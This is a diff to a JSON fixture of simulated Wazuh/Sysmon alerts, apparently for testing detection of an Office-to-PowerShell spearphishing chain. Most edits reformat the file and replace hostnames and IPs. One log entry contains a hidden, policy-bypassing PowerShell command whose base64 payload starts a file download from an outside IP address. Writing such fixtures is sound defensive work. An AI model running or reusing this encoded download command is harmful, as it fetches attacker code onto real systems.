@@ -7,9 +7,7 @@
     "expected_detection": "MEDIUM",
     "kill_chain_phase": "initial-access",
     "format": "wazuh-native",
-    "format_version": "1.0",
-    "campaign": "31",
-    "batch": "12"
+    "format_version": "1.0"
   },
   "logs": [
     {
@@ -23,18 +21,40 @@
           "description": "Sysmon - Event 1: Office Application Spawning PowerShell",
           "id": "100100",
           "mitre": {
-            "id": ["T1566.001", "T1059.001"],
-            "tactic": ["Initial Access", "Execution"],
-            "technique": ["Spearphishing Attachment", "PowerShell"]
+            "id": [
+              "T1566.001",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Execution"
+            ],
+            "technique": [
+              "Spearphishing Attachment",
+              "PowerShell"
+            ]
           },
           "firedtimes": 1,
           "mail": false,
-          "groups": ["sysmon", "sysmon_event1", "windows", "attack"]
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "attack"
+          ]
         },
-        "agent": {"id": "014", "name": "WS01", "ip": "10.1.0.20"},
-        "manager": {"name": "wazuh.manager"},
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
         "id": "1710000001.000001",
-        "decoder": {"name": "windows_eventchannel"},
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
         "location": "EventChannel",
         "data": {
           "win": {
@@ -42,7 +62,7 @@
               "eventID": "1",
               "channel": "Microsoft-Windows-Sysmon/Operational",
               "providerName": "Microsoft-Windows-Sysmon",
-              "computer": "WS01.yourcompany.local",
+              "computer": "WS01.corp.local",
               "level": "4",
               "task": "1",
               "severityValue": "INFORMATION"
@@ -54,7 +74,7 @@
               "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "commandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMAbABpAGUAbgB0AC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA",
               "currentDirectory": "C:\\Users\\analyst\\AppData\\Local\\Temp\\",
-              "user": "YOURCOMPANY\\analyst",
+              "user": "CORP\\analyst",
               "integrityLevel": "Medium",
               "hashes": "SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
               "parentProcessGuid": "{a23d45b8-c8f2-65e7-1234-000000001000}",
@@ -80,18 +100,36 @@
           "description": "Sysmon - Event 3: PowerShell Outbound Network Connection",
           "id": "100103",
           "mitre": {
-            "id": ["T1071.001"],
-            "tactic": ["Command and Control"],
-            "technique": ["Web Protocols"]
+            "id": [
+              "T1071.001"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Web Protocols"
+            ]
           },
           "firedtimes": 1,
           "mail": false,
-          "groups": ["sysmon", "sysmon_event3", "windows"]
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
         },
-        "agent": {"id": "014", "name": "WS01", "ip": "10.1.0.20"},
-        "manager": {"name": "wazuh.manager"},
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
         "id": "1710000001.000002",
-        "decoder": {"name": "windows_eventchannel"},
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
         "location": "EventChannel",
         "data": {
           "win": {
@@ -99,7 +137,7 @@
               "eventID": "3",
               "channel": "Microsoft-Windows-Sysmon/Operational",
               "providerName": "Microsoft-Windows-Sysmon",
-              "computer": "WS01.yourcompany.local",
+              "computer": "WS01.corp.local",
               "level": "4",
               "task": "3",
               "severityValue": "INFORMATION"
@@ -109,10 +147,10 @@
               "processGuid": "{a23d45b8-c8f2-65e7-1234-000000001100}",
               "processId": "4532",
               "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-              "user": "YOURCOMPANY\\analyst",
+              "user": "CORP\\analyst",
               "protocol": "tcp",
               "initiated": "true",
-              "sourceIp": "10.1.0.20",
+              "sourceIp": "198.51.100.20",
               "sourcePort": "49823",
               "destinationIp": "185.220.101.50",
               "destinationPort": "443",
